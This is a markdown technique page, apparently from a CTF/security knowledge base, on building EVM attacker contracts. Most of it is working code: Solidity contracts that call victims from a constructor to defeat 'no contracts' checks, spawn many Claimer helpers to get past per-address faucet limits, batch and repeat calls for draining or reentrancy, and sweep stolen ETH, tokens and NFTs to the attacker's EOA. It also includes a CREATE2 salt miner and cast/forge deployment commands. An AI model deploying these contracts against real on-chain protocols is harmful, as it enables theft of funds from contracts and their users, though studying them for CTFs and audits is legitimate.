---
title: "Writing the Attacker Contract - Constructor Tricks, CREATE2 Mining, Multicall"
category: blockchain
subcategory: exploitation
type: technique
tags: [blockchain, attacker-contract, constructor, extcodesize, tx-origin, create2, salt-mining, multicall, atomic, solidity, evm, foundry, forge-create, batching, selfdestruct, flash-loan, same-block]
difficulty: medium
summary: "Patterns for the exploit contract itself: beating EOA-only checks from a constructor, mining an address, and doing everything atomically in one call."
when_to_use:
  - "The victim blocks contracts with extcodesize or tx.origin == msg.sender"
  - "Everything must happen in a single block or a single transaction"
  - "You need a specific attacker address (bitmask, vanity, hash property)"
  - "You need to batch many calls and keep the profit in one place"
tools: [foundry, forge, cast, solidity]
related: [bad-randomness, reentrancy, evm-bytecode-and-create2, oracle-flashloan-manipulation, solve-template]
---

## TL;DR

Most EVM solves are one contract that does everything inside one transaction. Know four tricks:
run the attack in the constructor (defeats `extcodesize` checks), mine a `CREATE2` salt when the
address itself matters, batch with a loop or a `multicall`, and always finish with a sweep to your
EOA.

## Recognise it

- `require(msg.sender == tx.origin, "no contracts");`
- `require(extcodesize(msg.sender) == 0);` or `require(msg.sender.code.length == 0);`
- `require(uint160(msg.sender) & 0xffff == 0)` / "your address must start with 0x0000".
- Two actions that must be in the same block (price manipulation, randomness, flash loan).
- A rate limit of "one per address" that you defeat by deploying many helper contracts.
- `isSolved()` checks a value that only holds transiently.

## Theory

### The constructor window

While a contract's constructor runs, the account **has no code yet**: `EXTCODESIZE` returns 0 and
`address.code.length` is 0. So any guard of the form "the caller must be an EOA, proven by having
no code" passes for a contract that calls out from its constructor.

What the constructor window does **not** defeat:

- `require(msg.sender == tx.origin)` - `msg.sender` is your contract, `tx.origin` is your EOA, so
  they differ. For this you need the victim to be called *directly* by your EOA, or you need a
  different bypass (see below).
- `msg.sender.code.length` checked *after* your constructor finished.

### Beating `tx.origin == msg.sender`

- **Call directly from your EOA** and put only the pure computation off-chain. For randomness, work
  out the winning input off-chain and send it from the EOA.
- **EIP-7702 delegated EOAs** (Prague): an EOA can have code. Where supported, `tx.origin` and
  `msg.sender` are the same address while code executes. Check the challenge's `evm_version`.
- **Make the victim call you**: if any privileged actor calls your address (a bot, a refund, a
  token hook), you execute inside *their* transaction where `tx.origin` is theirs.

### `CREATE2` salt mining

`address = keccak256(0xff || factory || salt || keccak256(initCode))[12:]`

Because you control `salt` freely, you can brute-force an address with any cheap property:
a prefix, a suffix, a bitmask, or "`keccak256(abi.encode(addr)) % 100 == 7`". Cost is roughly
`16**k` hashes for a `k`-hex-digit prefix - 4 digits is instant, 6 digits is seconds, 8 digits is
minutes on a laptop.

`cast create2 --starts-with` does this for you; for a custom predicate, write the loop yourself.

### Atomicity

One transaction = one atomic state transition. Anything that must not be observed by anyone else
(a manipulated price, a temporary balance, a flash-loaned position) must live inside one call.
Practical shapes:

1. **One contract with one entry point** doing everything (preferred).
2. **`multicall`**: a loop of `address(this).delegatecall(data[i])` - useful when the victim itself
   exposes a multicall and you want to chain its functions.
3. **Constructor-only**: the entire exploit in `constructor()`, so deployment *is* the attack.

Beware: `msg.value` is **not** consumed by `delegatecall`, so a victim's own `multicall` that is
`payable` and uses `msg.value` in each sub-call lets you spend the same ether N times - a bug class
in itself.

## Attack

1. Write the contract with `owner` fixed at construction and an `onlyOwner` entry point.
2. Fund it in the same transaction that deploys it (`forge create --value`, or
   `new Attacker{value: x}()`).
3. Do the attack.
4. Sweep every asset back to the EOA: ETH, each ERC20, each NFT.
5. `require` the success condition at the end so a failed attempt reverts loudly.

## Code

### Constructor-only attacker (beats `extcodesize` / `code.length` checks)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVictim {
    /// require(msg.sender.code.length == 0, "no contracts");
    function claimReward() external;
    function reward(address) external view returns (uint256);
}

/// The whole attack runs while address(this).code.length == 0.
/// Deployment itself is the exploit; there is no second transaction.
contract ConstructorAttacker {
    constructor(address victim, address payable beneficiary) payable {
        IVictim(victim).claimReward();
        // sweep immediately -- after the constructor we may not be able to call again
        (bool ok, ) = beneficiary.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
```

```bash
# deployment == exploit
forge create src/ConstructorAttacker.sol:ConstructorAttacker \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" \
  --value 0.1ether \
  --constructor-args "$TARGET" "$ME"
```

### Many-helpers pattern (beats "one claim per address")

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFaucet {
    function claim() external;                    // one per address
}

interface IERC20 {
    function transfer(address to, uint256 a) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

/// Each Claimer is a distinct address AND has zero code size during its
/// constructor, so it beats both the per-address limit and an EOA-only check.
contract Claimer {
    constructor(address faucet, address token, address collector) {
        IFaucet(faucet).claim();
        IERC20 t = IERC20(token);
        t.transfer(collector, t.balanceOf(address(this)));
    }
}

contract Harvester {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function harvest(address faucet, address token, uint256 n) external {
        require(msg.sender == owner, "not owner");
        for (uint256 i = 0; i < n; i++) {
            new Claimer(faucet, token, address(this));
        }
    }

    function sweep(address token) external {
        IERC20 t = IERC20(token);
        t.transfer(owner, t.balanceOf(address(this)));
    }
}
```

### CREATE2 factory + salt mining

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Create2Factory {
    event Deployed(address addr, bytes32 salt);

    function deploy(bytes32 salt, bytes memory initCode) external payable returns (address addr) {
        assembly {
            addr := create2(callvalue(), add(initCode, 0x20), mload(initCode), salt)
        }
        require(addr != address(0), "create2 failed");
        emit Deployed(addr, salt);
    }

    function predict(bytes32 salt, bytes32 initCodeHash) public view returns (address) {
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, initCodeHash)
        ))));
    }

    /// On-chain grinding is expensive; use it only for a short prefix.
    function mine(bytes32 initCodeHash, uint160 mask, uint160 want, uint256 maxTries)
        external
        view
        returns (bytes32 salt, address addr)
    {
        for (uint256 i = 0; i < maxTries; i++) {
            salt = bytes32(i);
            addr = predict(salt, initCodeHash);
            if (uint160(addr) & mask == want) {
                return (salt, addr);
            }
        }
        revert("not found");
    }
}
```

Off-chain mining with a custom predicate:

```python
#!/usr/bin/env python3
"""Mine a CREATE2 salt whose resulting address satisfies an arbitrary predicate.

pip install eth-utils
Usage: FACTORY=0x.. INIT_HASH=0x.. python3 mine.py
"""
import os
from typing import Callable

from eth_utils import keccak, to_checksum_address


def create2(factory: bytes, salt: bytes, init_hash: bytes) -> bytes:
    return keccak(b"\xff" + factory + salt + init_hash)[12:]


def mine(factory_hex: str, init_hash_hex: str, predicate: Callable[[bytes], bool],
         start: int = 0, limit: int = 20_000_000):
    factory = bytes.fromhex(factory_hex.removeprefix("0x"))
    init_hash = bytes.fromhex(init_hash_hex.removeprefix("0x"))
    assert len(factory) == 20 and len(init_hash) == 32
    for i in range(start, start + limit):
        salt = i.to_bytes(32, "big")
        addr = create2(factory, salt, init_hash)
        if predicate(addr):
            return salt, to_checksum_address(addr)
    raise RuntimeError("no salt found in range")


def prefix_predicate(prefix_hex: str) -> Callable[[bytes], bool]:
    want = prefix_hex.removeprefix("0x").lower()
    return lambda a: a.hex().startswith(want)


def low_bits_zero(nbits: int) -> Callable[[bytes], bool]:
    mask = (1 << nbits) - 1
    return lambda a: (int.from_bytes(a, "big") & mask) == 0


def hash_property(modulus: int, target: int) -> Callable[[bytes], bool]:
    """e.g. the victim computes keccak256(abi.encode(msg.sender)) % 100 and you must match."""
    return lambda a: int.from_bytes(keccak(a.rjust(32, b"\x00")), "big") % modulus == target


if __name__ == "__main__":
    factory = os.environ.get("FACTORY", "0x4e59b44847b379578588920cA78FbF26c0B4956C")
    init_hash = os.environ.get("INIT_HASH", "0x" + keccak(b"\x60\x80\x60\x40\x52").hex())

    # self-test: determinism + a trivially findable predicate
    f = bytes.fromhex(factory.removeprefix("0x"))
    h = bytes.fromhex(init_hash.removeprefix("0x"))
    assert create2(f, b"\x00" * 32, h) == create2(f, b"\x00" * 32, h)
    assert create2(f, b"\x00" * 32, h) != create2(f, b"\x01" * 32, h)

    salt, addr = mine(factory, init_hash, prefix_predicate("0"), limit=100_000)
    assert addr[2:].lower().startswith("0")
    print(f"[+] self-test ok")
    print(f"    salt    = 0x{salt.hex()}")
    print(f"    address = {addr}")
```

```bash
# foundry's built-in miner (prefix/suffix only)
INIT=$(forge inspect src/Attacker.sol:Attacker bytecode)
cast create2 --starts-with dead --deployer "$FACTORY" --init-code-hash "$(cast keccak "$INIT")"
```

### Multicall / batching attacker

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 a) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 id) external;
}

/// A reusable exploit harness: batch arbitrary calls atomically, then sweep.
contract Multicaller {
    address public immutable owner;

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    constructor() payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// Execute every call; revert everything if any one fails.
    function batch(Call[] calldata calls) external payable onlyOwner returns (bytes[] memory out) {
        out = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool ok, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!ok) {
                // bubble the original revert reason
                assembly {
                    revert(add(ret, 0x20), mload(ret))
                }
            }
            out[i] = ret;
        }
    }

    /// Same, but tolerate individual failures (useful for spraying).
    function batchTry(Call[] calldata calls) external payable onlyOwner returns (bool[] memory ok_) {
        ok_ = new bool[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool ok, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            ok_[i] = ok;
        }
    }

    /// Repeat one call n times -- reentrancy loops, faucet draining, nonce burning.
    function repeat(address target, uint256 value, bytes calldata data, uint256 n)
        external
        payable
        onlyOwner
    {
        for (uint256 i = 0; i < n; i++) {
            (bool ok, ) = target.call{value: value}(data);
            require(ok, "iteration failed");
        }
    }

    function sweepEth() external onlyOwner {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    function sweepToken(address token) external onlyOwner {
        IERC20 t = IERC20(token);
        require(t.transfer(owner, t.balanceOf(address(this))), "token sweep failed");
    }

    function sweepNft(address nft, uint256 id) external onlyOwner {
        IERC721(nft).transferFrom(address(this), owner, id);
    }

    // accept every kind of incoming asset so hooks do not revert
    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata)
        external pure
    {}
}
```

Driving the multicaller from `cast`:

```bash
# build one Call tuple: (target, value, data)
DATA=$(cast calldata "withdraw(uint256)" 1000000000000000000)
cast send "$MC" "repeat(address,uint256,bytes,uint256)" "$TARGET" 0 "$DATA" 20 \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"

# array-of-struct form
cast send "$MC" "batch((address,uint256,bytes)[])" \
  "[($TARGET,0,$DATA),($TARGET2,1000000000000000000,0x)]" \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
```

### Self-destructing attacker (leave no trace / reclaim gas)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract OneShot {
    address payable public immutable owner;

    constructor() payable {
        owner = payable(msg.sender);
    }

    function attackAndVanish(address target, bytes calldata data) external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = target.call(data);
        require(ok, "attack failed");
        // sends the whole balance to owner; post-Cancun the code survives, the ether still moves
        selfdestruct(owner);
    }

    receive() external payable {}
}
```

## Variants & pitfalls

- **Constructor + `code.length` check ordering**: if the victim checks `msg.sender.code.length`
  *inside* a callback that happens after your constructor returns, the trick fails.
- **`tx.origin == msg.sender` cannot be beaten from a constructor.** Different bypass needed.
- **Funding**: `forge create --value` funds during deployment; `new Attacker{value: x}()` from a
  script requires the script contract itself to hold the ether (`vm.deal` in tests, a payable
  `run()` and `--value` when broadcasting).
- **`owner` must be `msg.sender` at construction**, not `tx.origin`, if a factory deploys you -
  otherwise `onlyOwner` locks you out.
- **Always implement the receiver hooks** (`receive`, `onERC721Received`, `onERC1155Received`,
  `tokensReceived`) or a `safeTransfer` to your contract reverts and the exploit dies.
- **Return-data bubbling**: the assembly `revert(add(ret,0x20), mload(ret))` preserves the victim's
  revert reason, which saves enormous debugging time.
- **`create2` reverts on collision**, so re-running a salt-mined deployment fails; bump the salt.
- **Gas**: a loop of `new Claimer(...)` costs ~50-60k each; a 30M block fits a few hundred.
- **`forge script` vs a single contract**: if the challenge needs strict atomicity, a script with
  several `broadcast` calls is *not* atomic. Put it in one contract function.
- **Verify before you fire**: `cast call` the exact calldata first; it simulates without spending.

## Tools

- `forge create --value --constructor-args`, `forge script --broadcast --slow`
- `cast create2 --starts-with/--ends-with`, `cast compute-address`
- `forge inspect <C> bytecode` for the init code you hash
- `cast call --trace` to dry-run a batch before sending

## References

- Solidity docs: "Contracts - Creating Contracts" (constructor/code-size semantics).
- EIP-1014 (`CREATE2`), EIP-7702 (EOA code delegation).
